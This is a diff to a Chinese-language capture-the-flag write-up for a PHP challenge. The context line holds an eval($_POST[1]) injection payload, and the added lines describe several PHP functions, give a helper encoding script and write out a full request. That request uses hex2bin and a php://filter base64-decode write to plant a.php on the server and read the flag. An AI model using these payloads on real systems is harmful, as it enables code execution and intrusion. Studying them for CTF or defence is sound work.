@@ -172,12 +172,26 @@ pyload=`URL/?v1=1&v2=eval($_POST[1])?>&v3=;`
 ![5](TU/PHP4x15.png)
 
 
-[substr()](https://www.php.net/manual/zh/function.substr.php):返回字符串的子串
+**[substr()](https://www.php.net/manual/zh/function.substr.php)**:返回字符串的子串(从指定位置开始, 返回指定长度的字符)
+**[call_user_func()](https://www.php.net/manual/zh/function.call-user-func.php)**:调用用户函数或方法, 可以传递参数
+**[file_put_contents()](https://www.php.net/manual/zh/function.file-put-contents.php)**:将字符串写入文件。如果 文件名 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 FILE_APPEND flag。
+**[hex2bin()](https://www.php.net/manual/zh/function.hex2bin.php)**:将十六进制字符串转换为二进制字符串。
+**[bin2hex()](https://www.php.net/manual/zh/function.bin2hex.php)**:将二进制字符串转换为十六进制字符串。
+```
+<?php
+echo bin2hex(str_replace('=', '', base64_encode($_GET[1])));
+echo "\n";
+echo hex2bin(str_replace('=', '', base64_encode($_POST[2])));
+?>
+
+```
+hex 码前面记得补两个0 (substr)
+然后访问 a.php 得到 flag
+
+`?v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=a.php`
 
 
-
-
-
+`v1=hex2bin`
 
 
 
